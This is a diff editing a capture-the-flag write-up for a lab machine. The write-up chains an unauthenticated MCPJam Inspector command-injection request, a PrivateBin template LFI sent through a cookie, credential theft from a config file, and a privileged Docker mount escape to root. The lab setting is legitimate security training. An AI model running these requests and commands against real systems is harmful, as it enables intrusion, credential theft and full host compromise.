@@ -17,7 +17,7 @@ tags: [linux, mcp, cve-2026-23744, privatebin, docker, container-escape]
 
 ## TL;DR
 
-Three modern services: **MCPJam Inspector** (an MCP server viewer), a **PrivateBin** and a Docker panel (**Arcane**). The inspector carries **CVE-2026-23744**: `/api/mcp/connect` passes the `command` field to `child_process.spawn()` with no authentication, so one JSON body gives a shell as `ben`. From there, the `operator` group can write into a directory PrivateBin mounts, and its template LFI (**CVE-2025-64714**) executes the PHP; the `conf.php` credentials open Arcane as admin, and a privileged container with `/` mounted finishes the box.
+Three modern services: **MCPJam Inspector 1.4.2** (an MCP server viewer), **PrivateBin 2.0.2** and **Arcane 1.13.0** (Docker management). The inspector carries **CVE-2026-23744** (fixed in 1.4.3): `/api/mcp/connect` passes the `command` field to `child_process.spawn()` with no authentication, so one JSON body gives a shell as `ben`. From there, the `operator` group can write into the data directory PrivateBin mounts into its container, and its template LFI (**CVE-2025-64714**, 1.7.7–2.0.2, patched in 2.0.3) executes the PHP through the `template` cookie; the panel config leaks credentials that open Arcane as admin, and a privileged container with `/` mounted finishes the box.
 
 ## Recon
 
@@ -28,19 +28,19 @@ ffuf -u http://<IP> -H "Host: FUZZ.kobold.htb" -w subdomains.txt -mc 200,403
 
 ```text
 22/tcp    ssh
-80/tcp    http   (vhosts)
+80/tcp    http   nginx (vhosts)
 3552/tcp  http   Arcane (Docker management)
 ```
 
 ```text
-mcp.kobold.htb    -> MCPJam Inspector
-bin.kobold.htb    -> PrivateBin
+mcp.kobold.htb  -> MCPJam Inspector  (127.0.0.1:6274, HTTPS only, via nginx)
+bin.kobold.htb  -> PrivateBin 2.0.2   (127.0.0.1:8080, container)
 ```
 
 ## Foothold: CVE-2026-23744
 
 ```bash
-curl -s -X POST http://mcp.kobold.htb/api/mcp/connect \
+curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H 'Content-Type: application/json' \
   -d @- <<'JSON'
 {
@@ -67,26 +67,26 @@ grep -E "ben|operator|docker" /etc/group
 ```
 
 ```text
-operator:x:1001:ben
-docker:x:998:ben
+operator:x:37:ben
+docker:x:111:alice
 ```
 
-Two paths depending on what the spawned session activates; supplementary groups are not always loaded in a fresh shell.
+Note: `id` shows `operator` (37) but **not** `docker`, because that membership lives in `/etc/gshadow`. After reading the file, `newgrp docker` activates the group in the current shell; without it `docker run` fails with *permission denied*.
 
 ## Escalation I: PrivateBin and Arcane
 
 ```bash
-ls -ld /opt/privatebin/data /opt/privatebin/tpl
-# writable by the operator group
+ls -ld /privatebin-data/data
+# drwxrwx--- operator  -> writable by the group
 ```
 
-Drop a `.php` in the mounted directory and invoke it as a template:
+That host directory is mounted into the PrivateBin container, and the container's `php -S` serves from it. Drop a `.php` and request it as a template through the **cookie** `template`, resolved relative to `tpl/`:
 
 ```bash
-curl -s "http://bin.kobold.htb/?tpl=../../data/<file>" -o /dev/null
+curl -s --cookie "template=../../data/<file>" http://bin.kobold.htb/
 ```
 
-The template LFI (CVE-2025-64714) includes the file and runs the code. With the shell, read the config:
+The LFI (CVE-2025-64714) includes the file and runs the code **inside the container**. From that shell, read the config to get the Arcane credentials:
 
 ```bash
 cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
@@ -105,7 +105,7 @@ docker run -v /:/host --rm -it alpine chroot /host bash
 root@kobold:/# cat /root/root.txt
 ```
 
-In Arcane the equivalent is creating a privileged container with the host volume mounted and entering it.
+In Arcane the equivalent is logging in as admin (`admin`/`<password>`) and creating a privileged container with the host volume mounted. If that login is not reachable, Arcane 1.13.0 also carries an authentication bypass (**CVE-2026-23944**) and an SSRF in `/templates/fetch` (**CVE-2026-40242**).
 
 ## Evidence (redacted)
 
